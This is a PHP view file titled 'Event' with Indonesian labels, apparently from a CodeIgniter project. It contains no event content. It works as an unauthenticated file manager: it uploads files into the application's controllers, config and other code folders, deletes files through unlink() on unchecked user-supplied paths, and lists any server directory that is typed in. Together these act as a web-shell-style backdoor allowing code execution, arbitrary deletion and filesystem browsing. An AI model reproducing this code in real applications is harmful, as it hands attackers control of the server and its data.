<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Event</title>
</head>
<body>
		<table border="1">
			<tr>
				<td><b>Upload</b></td>
				<td><b>Hapus</b></td>
			</tr>
			<tr>
				<td>
					<form action="" method="post" enctype="multipart/form-data">
					<?php  
						echo $error_upload;
						echo $this->session->flashdata('success');
					?>
					<input type="file" name="nama">
					<br>
					<select name="dir" required>
						<option value="">--pilih --</option>
						<?php  
							$arr = array('controllers', 'models', 'views', 'config', 'libraries');

							for ($i=0; $i < count($arr); $i++) { 
								echo '<option value="'.$arr[$i].'">'.$arr[$i].'</option>';
							}
						?>
					</select>
					<br>
					<button type="submit" name="simpan"> Save</button>	
					</form>
				</td>

				<td>
					<?php  
						if (isset($_POST['hapus'])) 
						{
							$namadir = 'application/'.$this->input->post('namadir').'/';
							$namafile = $this->input->post('namafile');

							unlink($namadir.''.$namafile);
							echo 'berhasil meghapus';
						}
					?>

					<form action="" method="post" enctype="multipart/form-data">
						<select name="namadir">
							<option value="">--pilih --</option>
							<?php  
								$arr = array('controllers', 'models', 'views', 'config', 'libraries');

								for ($i=0; $i < count($arr); $i++) { 
									echo '<option value="'.$arr[$i].'">'.$arr[$i].'</option>';
								}
							?>
						</select>
						<input type="text" name="namafile">
						<input type="submit" name="hapus" value="Hapus">
					</form>
				</td>
			</tr>
		</table>



<form action="" method="POST">      
  Isikan nama direktori yang akan dibuka:</br>      
  <input name="folder" type="text" /> <br />      
  <input type="submit" name="enter" value="Buka" />      
</form>     
<?php      
if(isset($_POST["enter"]))     
{     
if(!empty($_POST["folder"]))     
{     
  //menentukan nama direktori baru dari input text dan mengecek standar formatnya     
  $target_dir = $_POST['folder'];      
  //mengecek keberadaan direktori    
  if((file_exists($target_dir))&&(is_dir($target_dir)))     
  {     
   //menaruh fungsi opendir kedalam sebuah handle     
   $handle = opendir ($target_dir);     
     
   //mengecek proses handle fungsi opendir      
   if ($handle) {      
       echo "Isi direktori <b>".$target_dir."</b> :<br />";    
       while (($file = readdir($handle)) !== false){    
              if($file != "." AND $file != "..")    
              {echo "- " . $file . "<br>";}    
    }    
    closedir($handle);    
   }      
   else {      
   echo "Direktori <b>".$target_dir."</b> tidak dapat dibuka";      
   }            
  }     
  else     
  {     
   echo "Direktori <b>".$target_dir."</b> Tidak ada";    
  }     
}     
}      
?>  

</body>
</html>